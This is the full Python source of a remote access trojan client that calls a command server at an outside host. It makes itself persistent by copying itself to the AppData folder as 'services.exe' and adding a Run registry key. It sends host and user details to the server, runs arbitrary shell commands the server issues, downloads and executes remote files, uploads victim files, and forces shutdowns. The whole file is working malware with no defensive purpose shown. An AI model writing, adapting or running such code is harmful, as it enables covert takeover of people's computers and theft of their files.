
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import os
import sys
import platform
import hashlib
import requests, grequests
import getpass
import shutil
import urllib2
import subprocess
from uuid import getnode
from time import sleep
from requests.utils import quote

# Replace with your URL/IP
caesar_folder = 'http://dashfiles.ga/Server'

def md5 (string):
	m = hashlib.md5()
	m.update (string)
	return m.hexdigest()



def split_response (response, start_separator, end_separator):
	output = []
	tmp = response.split(start_separator)
	for par in tmp:
		if end_separator in par:
			output.append(par.split(end_separator)[0])

	return output

def download_file(url):
    get_file = requests.get(url)
    file_n = url.split("/")[-1]
    with open(file_n, "wb") as downloaded_file:
        downloaded_file.write(get_file.content)
    return file_n

def internet():
	try:
		urllib2.urlopen('http://216.58.192.142')
		return True
	except urllib2.URLError as err: 
		return False

def become_persistent():
	evil_file_location = os.environ["appdata"] + "\\services.exe"
	if os.path.exists(evil_file_location):
		eleven = 10 + 1
	else:
		shutil.copyfile(sys.executable, evil_file_location)
		subprocess.call('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V WindowsServices /t REG_SZ /F /D "' + evil_file_location + '"', shell=True)


def handshake_req():
	# while the server does not responds 'OK' sends an handshake request
	global working_directory1
	while 1:

		try:
			r = requests.post (caesar_folder + '/target/handshake.php', data={'hostname': quote(hostname), 'username': quote(username), 'os': quote(operating_system), 'arch': arch, 'unique_id': unique_id, 'wd': quote(working_directory1)})
			if r.text == 'OK':
				break
		except:
			print 'Connection refused'

		sleep (1)

# Setting refresh delay
delay = 10

def dae_core():
	global working_directory1
	global caesar_folder

	global delay
	handshake_req()
	no_response = 0
	subprocesses = []
	while 1:

		# Checking if some subprocess has terminated
		if subprocesses !=  []:
			non_terminated = []
			for process in subprocesses:
				# If process has terminated:
				if process[0].poll() != None:
					out = process[0].stdout.read()
					err = process[0].stderr.read()

					output = err if err != '' else out

					command = process[1]['command']
					task_id = process[1]['task_id']
					working_directory1 = process[1]['wd']

					r = requests.post (caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory1)})

				else:
					non_terminated.append (process)

			subprocesses = non_terminated
			non_terminated = []

		# Check if there are new commands to execute
		r = requests.post (caesar_folder + '/target/tasks.php', data={'unique_id': unique_id})
		response = r.text

		# If the response from the server is not empty
		if response != '':

			# Splitting the response in order to get a list of commands to execute (and their identifiers)
			commands = split_response (response, '<command>', '</command>')
			ids = split_response (response, '<task_id>', '</task_id>')

			# Executing all commands contained in the list
			for command, task_id in zip(commands, ids):

				# If the user want a remote pseudo-connection
				if command == 'connect':
					delay = 1
					output = 'connected'

				elif command == 'exit':
					delay = 10
					output = 'exit'

				elif command == 'shutdown':
					subprocess.call('shutdown -s -t 5 -f',shell=True)
					output = '[*] Target PC Will Shutdown in 5 sec.'

				elif command == 'restart':
					subprocess.call('shutdown -r',shell=True)
					output = '[*] Target PC will restart in 5 sec.'

				elif command == 'log off':
					subprocess.call('shutdown -l',shell=True)
					output = '[*] Target PC Will Log Off in 5 sec.'

				elif command.startswith('show.'):
					current_user = getpass.getuser()
					to_show = command.split('.')
					subprocess.call('msg ' + current_user + ' ' + to_show[1],shell=True)
					output = '[*] The massege will be shown to victim for 60 sec.'

				elif command.startswith('cd '):
					try:
						directory = command.replace('cd ', '')
						os.chdir(directory)
						working_directory1 = os.getcwd()
						output = ''
					except OSError as e:
						output = e.strerror + "\n"
				elif command.startswith('download_from_web '):
					link_to_down = command.split(' ')
					download_link = link_to_down[1]
					downloaded_file = download_file(download_link)
					output = '[*] ' + downloaded_file + ' Is Downloaded.'

				elif command.startswith('dae '):
					link_to_down = command.split(' ')
					download_link = link_to_down[1]
					downloaded_file = download_file(download_link)
					working_directory1 = os.getcwd()
					file_to_execute = working_directory1 + '\\' + downloaded_file
					subprocess.call(file_to_execute, shell=True)
					output = '[*] ' + file_to_execute + ' Is executed.'

				# If the attacker want the victim to upload a file to the remote server
				elif command.startswith('download '):
					filename = command.replace ('download ', '')

					if os.path.isfile(filename):
						files = {'file_to_upload': open(filename,'rb')}

						# Start the download without blocking the process
						r = grequests.post(caesar_folder + '/target/upload.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id}, files=files)
						job = grequests.send(r, grequests.Pool(1))

						output = 'The file is being uploaded to the server'

					else:
						output = 'Inexistent file..'

				else:
					if os.name == 'nt':
						process = subprocess.Popen (command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
					else:
						process = subprocess.Popen ([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, close_fds=True)

					# Time for the subprocess to spawn
					sleep (0.5)

					# If the execution of the process has terminated immediately
					if process.poll() != None:
						out = process.stdout.read()
						err = process.stderr.read()

						output = err if err != '' else out

					# Else add the process to the list of non-terminated subprocesses
					else:
						new_subprocess = []

						# Appending to the list of subprocesses the instance of subprocess
						new_subprocess.append(process)

						# Appending to the list of subprocesses a dictionary containing metadata of the process
						new_subprocess.append({'command' : command, 'task_id' : task_id, 'wd' : working_directory1}.copy())
						subprocesses.append(new_subprocess)

						output = 'executing'

				# Send the output to the server
				r = requests.post (caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory1)})

			sleep (delay)

		else:
			# If the attacker is running a pseudo-interactive shell and he's not issuing commands
			if (delay != 10):
				# Increment the number of no-responses
				no_response += 1

				# If there are too many no-responses from the server reset the delay (close the interactive-shell)
				if no_response == 60:
					delay = 10
					no_response = 0

		sleep (delay)


become_persistent()

# Getting information from the system
hostname = platform.node()
username = getpass.getuser()
operating_system = platform.system() + ' ' + platform.release()
arch = platform.architecture()[0]
mac = "".join(c + ":" if i % 2 else c for i, c in enumerate(hex(getnode())[2:].zfill(12)))[:-2]
working_directory1 = os.getcwd()


# Generating unique id
unique_id = md5 (mac + operating_system + arch)



while True:
	try:
		if internet() == True:
			dae_core()
	except:
		sleep(10)
	sleep(10)
